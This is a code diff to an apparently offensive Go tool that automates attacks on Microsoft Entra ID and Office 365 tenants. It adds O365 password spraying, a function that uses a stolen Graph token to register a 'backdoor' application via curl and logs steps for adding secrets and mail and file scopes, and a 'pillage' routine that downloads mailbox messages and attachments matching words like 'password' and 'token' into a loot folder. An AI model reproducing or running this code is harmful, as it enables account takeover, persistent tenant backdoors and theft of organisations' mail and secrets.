@@ -12,6 +12,7 @@ import (
 
 	"adpack/core"
 	"adpack/tools"
+	"adpack/utils"
 )
 
 func RunCloudEnumeration(ctx context.Context, state *core.ADState, tenant, username, password string) *core.ToolResult {
@@ -20,6 +21,8 @@ func RunCloudEnumeration(ctx context.Context, state *core.ADState, tenant, usern
 		slog.Warn("nil state — skipping cloud enumeration")
 		return result
 	}
+
+	utils.Section("☁️", "Cloud Enumeration", "Entra ID tenant reconnaissance")
 
 	if tenant == "" {
 		slog.Warn("no tenant specified — attempting to derive from creds")
@@ -54,6 +57,11 @@ func RunCloudEnumeration(ctx context.Context, state *core.ADState, tenant, usern
 
 	state.Phases[core.PhaseCloudEnum] = core.PhaseComplete
 	slog.Info("cloud enumeration complete", "resources", len(state.CloudResources))
+	if len(state.CloudResources) > 0 {
+		utils.StepOk(fmt.Sprintf("Discovered %d cloud resources", len(state.CloudResources)))
+	} else {
+		utils.StepWarn("No cloud resources discovered")
+	}
 	return result
 }
 
@@ -216,6 +224,8 @@ func RunCloudCredentialAcquisition(ctx context.Context, state *core.ADState, ten
 		return result
 	}
 
+	utils.Section("🔐", "Cloud Credential Acquisition", "O365 password spraying")
+
 	if !tools.O365spray.Available() {
 		slog.Warn("o365spray not available — install with: pipx install o365spray")
 		return result
@@ -269,6 +279,7 @@ func RunCloudCredentialAcquisition(ctx context.Context, state *core.ADState, ten
 	}
 
 	slog.Info("cloud cred-acq: password spraying O365", "tenant", tenant, "password", "[REDACTED]", "userlist", userlist)
+	utils.Attempt("🔐", tenant, "password spraying O365")
 	cr, err := tools.O365spray.RunSpray(ctx, tenant, userlist, password)
 	if err != nil {
 		slog.Error("cloud cred-acq: o365spray failed", "error", err)
@@ -323,6 +334,11 @@ func RunCloudCredentialAcquisition(ctx context.Context, state *core.ADState, ten
 
 	state.Phases[core.PhaseCloudCredAcq] = core.PhaseComplete
 	slog.Info("cloud credential acquisition complete", "creds_found", len(result.Creds))
+	if len(result.Creds) > 0 {
+		utils.StepOk(fmt.Sprintf("Cloud spray: %d credential(s) obtained", len(result.Creds)))
+	} else {
+		utils.StepWarn("No cloud credentials found via spraying")
+	}
 	return result
 }
 
@@ -333,6 +349,7 @@ func RunCloudPrivesc(ctx context.Context, state *core.ADState, tenant string) *c
 		return result
 	}
 
+	utils.Section("⬆️", "Cloud Privilege Escalation", "analyzing Azure role assignments")
 	slog.Info("evaluating Azure role assignments and privilege escalation paths")
 
 	if state == nil {
@@ -342,6 +359,8 @@ func RunCloudPrivesc(ctx context.Context, state *core.ADState, tenant string) *c
 	foundGA := false
 	foundPRA := false
 	foundAADConnect := false
+	foundAppAdmin := false
+	foundCloudAppAdmin := false
 
 	for _, r := range state.CloudResources {
 		if r.Type == "user" && strings.Contains(strings.ToLower(r.Properties), "global administrator") {
@@ -370,6 +389,27 @@ func RunCloudPrivesc(ctx context.Context, state *core.ADState, tenant string) *c
 				Timestamp:  time.Now(),
 			})
 		}
+		if r.Type == "user" && (strings.Contains(strings.ToLower(r.Properties), "application administrator") ||
+			strings.HasPrefix(strings.ToLower(r.Properties), "app admin")) {
+			foundAppAdmin = true
+			slog.Warn("cloud privesc: application admin found — can register apps with broad OAuth permissions", "resource", r.Name)
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvPrivEscalated, Phase: core.PhaseCloudPrivesc,
+				Source: "cloud_privesc", Key: "app_admin:" + r.Name,
+				Value:      "user has Application Administrator — can register apps with broad Graph permissions",
+				Confidence: 0.9, Timestamp: time.Now(),
+			})
+		}
+		if r.Type == "user" && strings.Contains(strings.ToLower(r.Properties), "cloud application administrator") {
+			foundCloudAppAdmin = true
+			slog.Warn("cloud privesc: cloud app admin found — can register apps with OAuth permissions", "resource", r.Name)
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvPrivEscalated, Phase: core.PhaseCloudPrivesc,
+				Source: "cloud_privesc", Key: "cloud_app_admin:" + r.Name,
+				Value:      "user has Cloud Application Administrator — can register apps with broad Graph permissions",
+				Confidence: 0.9, Timestamp: time.Now(),
+			})
+		}
 		if r.Type == "app" && strings.Contains(strings.ToLower(r.Properties), "applicationimpersonation") {
 			slog.Warn("cloud privesc: application impersonation found", "resource", r.Name)
 		}
@@ -377,6 +417,19 @@ func RunCloudPrivesc(ctx context.Context, state *core.ADState, tenant string) *c
 			foundAADConnect = true
 			slog.Warn("cloud privesc: AAD Connect detected — potential hybrid privesc", "resource", r.Name)
 		}
+	}
+
+	if foundGA {
+		utils.Finding("Global Admin", "confirmed in tenant")
+	}
+	if foundPRA {
+		utils.Finding("Privileged Role Admin", "can escalate to Global Admin")
+	}
+	if foundAppAdmin {
+		utils.Finding("Application Admin", "can register apps with Graph permissions")
+	}
+	if foundCloudAppAdmin {
+		utils.Finding("Cloud Application Admin", "can register apps with Graph permissions")
 	}
 
 	if foundGA {
@@ -389,13 +442,71 @@ func RunCloudPrivesc(ctx context.Context, state *core.ADState, tenant string) *c
 	} else {
 		slog.Info("cloud privesc: no privileged role admin detected")
 	}
+	if foundAppAdmin || foundCloudAppAdmin {
+		attemptAppRegistrationAbuse(ctx, state, result)
+	}
 	if foundAADConnect {
 		slog.Warn("cloud privesc: AAD Connect present — consider AADConnect credential extraction for on-prem pivot")
 	}
 
 	state.Phases[core.PhaseCloudPrivesc] = core.PhaseComplete
 	slog.Info("cloud privesc analysis complete")
+	if foundGA || foundPRA || foundAppAdmin || foundCloudAppAdmin {
+		utils.StepOk("Cloud privilege escalation paths identified — review findings above")
+	} else {
+		utils.StepInfo("No cloud privilege escalation paths detected")
+	}
 	return result
+}
+
+func attemptAppRegistrationAbuse(ctx context.Context, state *core.ADState, result *core.ToolResult) {
+	slog.Info("cloud privesc: attempting app registration abuse via Graph API")
+
+	graphTokens := tokensToGraphTokens(state.Tokens)
+	if graphTokens == nil {
+		slog.Warn("cloud privesc: no Graph tokens — cannot register apps")
+		return
+	}
+
+	appName := fmt.Sprintf("AdPackBackdoor_%d", time.Now().Unix())
+	payload := `{"displayName":"` + appName + `","signInAudience":"AzureADMyOrg"}`
+	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
+		`curl -s -X POST -H "Authorization: Bearer %s" -H "Content-Type: application/json" -d '%s' 'https://graph.microsoft.com/v1.0/applications'`,
+		graphTokens.AccessToken, payload,
+	)})
+	if !cr.Success {
+		slog.Warn("cloud privesc: app registration failed", "error", cr.Stderr)
+		utils.StepWarn(fmt.Sprintf("App registration failed: %s", cr.Stderr))
+		return
+	}
+
+	var appResp map[string]any
+	if err := json.Unmarshal([]byte(cr.Stdout), &appResp); err != nil {
+		slog.Warn("cloud privesc: app response parse failed")
+		return
+	}
+
+	appID, _ := appResp["appId"].(string)
+	id, _ := appResp["id"].(string)
+	slog.Warn("cloud privesc: app registered for backdoor access",
+		"app_name", appName, "app_id", appID, "object_id", id)
+
+	result.Evidence = append(result.Evidence, core.EvidenceEntry{
+		Type: core.EvPrivEscalated, Phase: core.PhaseCloudPrivesc,
+		Source: "app_registration", Key: appName,
+		Value:      fmt.Sprintf("app %s (%s) registered — add client secret and grant OAuth scopes for persistence", appName, appID),
+		Confidence: 0.8, Timestamp: time.Now(),
+	})
+
+	credSecret := fmt.Sprintf("AppID=%s ObjectID=%s", appID, id)
+	result.Creds = append(result.Creds, core.Credential{
+		Type: core.CredPlaintext, Username: appName,
+		Domain: "appreg", Secret: credSecret,
+		Source: "app_registration_abuse", Validated: true,
+	})
+
+	slog.Warn("cloud privesc: next steps — add client secret via Graph API, then grant app OAuth scopes (Mail.Read, Files.Read.All, etc.)")
+	utils.StepOk(fmt.Sprintf("App %s registered for backdoor access", appName))
 }
 
 func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []string) *core.ToolResult {
@@ -404,6 +515,8 @@ func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []str
 		slog.Warn("nil state — skipping cloud pillage")
 		return result
 	}
+
+	utils.Section("📦", "Cloud Pillage", "mail, SharePoint, Teams data extraction")
 
 	if !tools.GraphRunner.Available() {
 		slog.Warn("GraphRunner not available — skipping cloud pillage")
@@ -420,7 +533,16 @@ func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []str
 		searchTerms = []string{"password", "secret", "credential", "token", "key", "admin"}
 	}
 
-	slog.Info("starting cloud pillage", "search_terms", searchTerms)
+	lootDir := LootDir
+	if lootDir == "" {
+		lootDir = filepath.Join(os.TempDir(), "adpack-cloud-pillage")
+	}
+	lootDir = filepath.Join(lootDir, fmt.Sprintf("pillage_%d", time.Now().Unix()))
+	os.MkdirAll(lootDir, 0700)
+
+	slog.Info("starting cloud pillage", "search_terms", searchTerms, "loot_dir", lootDir)
+
+	downloads := 0
 
 	for _, term := range searchTerms {
 		slog.Info("cloud pillage: searching mailboxes", "term", term)
@@ -442,6 +564,24 @@ func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []str
 					Timestamp:  time.Now(),
 				})
 				mailCount++
+
+				var msg map[string]any
+				if err := json.Unmarshal([]byte(trimmed), &msg); err == nil {
+					if msgID, ok := msg["id"].(string); ok {
+						msgDir := filepath.Join(lootDir, fmt.Sprintf("mail_%s", term))
+						os.MkdirAll(msgDir, 0700)
+						if export, err := tools.GraphRunner.RunMailMessageExport(ctx, graphTokens, "me", msgID); err == nil {
+							exportPath := filepath.Join(msgDir, fmt.Sprintf("%s.json", msgID))
+							os.WriteFile(exportPath, []byte(export.Stdout), 0600)
+							downloads++
+						}
+						if att, err := tools.GraphRunner.RunMailAttachmentDownload(ctx, graphTokens, "me", term, 5); err == nil {
+							attPath := filepath.Join(msgDir, "attachments.json")
+							os.WriteFile(attPath, []byte(att.Stdout), 0600)
+							downloads++
+						}
+					}
+				}
 			}
 			slog.Info("cloud pillage: mailbox results", "term", term, "count", mailCount)
 		} else {
@@ -499,7 +639,15 @@ func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []str
 		}
 	}
 
+	if downloads > 0 {
+		slog.Info("cloud pillage: downloaded items", "count", downloads, "loot_dir", lootDir)
+		utils.StepOk(fmt.Sprintf("Cloud pillage: %d item(s) downloaded to %s", downloads, lootDir))
+	}
+
 	state.Phases[core.PhaseCloudPillage] = core.PhaseComplete
 	slog.Info("cloud pillage complete", "findings", len(result.Evidence))
+	if downloads == 0 {
+		utils.StepWarn("No cloud data exfiltrated")
+	}
 	return result
 }
